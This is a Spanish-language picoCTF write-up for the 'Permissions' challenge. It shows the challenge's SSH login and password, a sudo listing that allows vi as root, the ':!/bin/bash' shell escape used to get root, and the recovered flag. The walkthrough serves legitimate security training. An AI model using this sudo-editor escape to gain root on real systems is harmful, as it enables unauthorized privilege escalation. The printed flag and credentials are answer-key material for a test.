### Permissions

### DESCRIPCIÓN

Can you read files in the root file?The system admin has provisioned an account for you on the main server:
`ssh -p 63052 picoplayer@saturn.picoctf.net`
Password: `33qE7mB5BF`
Can you login and read the root file?
### SOLUCIÓN

Ingresar al servidor por SSH desde la consola en Kali Linux:

```
┌──(kali㉿kali)-[~]
└─$ ssh -p 56790 picoplayer@saturn.picoctf.net 
```

Comprobar que permisos se tiene con los comando
'whoami' y 'sudo -l':

```
picoplayer@challenge:~$ whoami
picoplayer
picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi

```

Podemos ver que tenemos acceso al editor de texto vi. Esto significa que podemos ejecutar vi como root en cualquier archivo.

Crear un archivo en el directorio actual:

```
sudo vi test
```

Ejecutando el siguiente script en modo comando vi:
`:!/bin/bash`
Comprobar otra vez que permisos tenemos:

```
:!/bin/bash

picoplayer@challenge:~$ sudo vi test

[No write since last change]
root@challenge:/home/picoplayer# whoami
root
root@challenge:/home/picoplayer# 

```

Ejecutar otra vez ls -la:

```
root@challenge:/home/picoplayer# cd /root
root@challenge:~# ls
root@challenge:~# ls -la
total 12
drwx------ 1 root root   23 Aug  4  2023 .
drwxr-xr-x 1 root root   51 Feb 20 23:35 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
root@challenge:~# cat .flag.txt
picoCTF{uS1ng_v1m_3dit0r_3dd6dcf4}
```
### NOTAS ADICIONALES

1. Verificación de usuario actual
	Usé whoami para confirmar el usuario activo.
	Es importante validar si ya se tienen privilegios elevados antes de continuar.
2. Escalada de privilegios
	Se utilizó sudo para ejecutar un editor (vi).
	Desde vi fue posible invocar una shell con:
	:!/bin/bash
	Esto permitió obtener una shell con privilegios elevados (root).
### REFERENCIAS